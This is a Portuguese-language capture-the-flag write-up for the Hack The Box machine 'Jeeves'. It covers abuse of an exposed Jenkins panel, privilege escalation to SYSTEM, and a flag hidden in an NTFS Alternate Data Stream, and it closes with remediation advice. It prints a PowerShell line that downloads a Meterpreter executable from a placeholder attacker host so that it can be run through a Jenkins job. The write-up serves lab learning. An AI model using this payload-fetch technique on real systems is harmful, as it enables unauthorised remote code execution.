---
title: "Writeup Hack The Box: Jeeves"
date: 2025-12-18
description: "Exploração de Jenkins e descoberta de dados em Alternate Data Streams (ADS)."
tags: ["htb", "jenkins", "ads", "windows", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Sumário Executivo

O host foi comprometido via uma instância exposta do Jenkins. A execução remota foi obtida através de jobs do Jenkins, levando a uma shell SYSTEM. A flag final estava oculta dentro de um **Alternate Data Stream (ADS)**, exigindo enumeração avançada do sistema de arquivos.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Descoberta e Enumeração Web
O brute-force de diretórios descobriu `/askjeeves/`, que hospedava o painel do Jenkins na porta 50000.
* **Técnica MITRE:** [T1083](https://attack.mitre.org/techniques/T1083/) - Descoberta de Arquivos e Diretórios.

#### 2. Exploração
Um novo job do Jenkins foi criado usando a funcionalidade "Execute Windows batch command" para baixar e executar um payload Meterpreter.
```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>/shell.exe','C:\Users\Public\shell.exe')
```
* **Técnica MITRE:** [T1609](https://attack.mitre.org/techniques/T1609/) - Execução em Container/Job.

#### 3. Escalação de Privilégios e Recuperação da Flag
O comando `getsystem` elevou a sessão com sucesso. A flag de root não foi encontrada no diretório padrão, mas foi descoberta como um **ADS** anexado ao arquivo `hm.txt`.
```cmd
dir /R hm.txt
more < hm.txt:root.txt
```
* **Técnica MITRE:** [T1564.004](https://attack.mitre.org/techniques/T1564/004/) - Esconder Artefatos: Atributos de Arquivo NTFS.

### Remediação (NIST SP 800-115)

* **Controle de Acesso:** Habilitar autenticação para todas as interfaces do Jenkins.
* **Monitoramento:** Auditar a execução do PowerShell e a criação de Alternate Data Streams.